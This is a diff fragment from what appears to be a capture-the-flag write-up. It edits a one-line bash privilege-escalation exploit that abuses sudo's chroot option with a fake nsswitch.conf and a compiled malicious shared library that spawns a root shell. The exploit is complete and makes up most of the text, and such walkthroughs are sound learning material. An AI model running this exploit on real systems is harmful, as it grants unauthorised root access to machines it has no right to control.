@@ -101,7 +101,7 @@ And this is it! We get a shell as `root` and we cat the flag!
 
 Here's a one liner exploit:
 ```bash
-mkdir -p woot/etc libnss_ && echo "passwd: /woot1337" > woot/etc/nsswitch.conf && cp /etc/group woot/etc && printf '#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void woot(void){setreuid(0,0);setregid(0,0);chdir("/");execl("/bin/sh","sh","-c","/bin/sh",NULL);}\n' > exploit.c && gcc -shared -fPIC -o libnss_/woot1337.so.2 exploit.c && sudo -R woot woot
+mkdir -p woot/etc libnss_ && echo "passwd: /woot1337" > woot/etc/nsswitch.conf && printf '#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void woot(void){setreuid(0,0);setregid(0,0);chdir("/");execl("/bin/sh","sh","-c","/bin/sh",NULL);}\n' > exploit.c && gcc -shared -fPIC -o libnss_/woot1337.so.2 exploit.c && sudo -R woot woot
 ```
 
 > [!info] Note
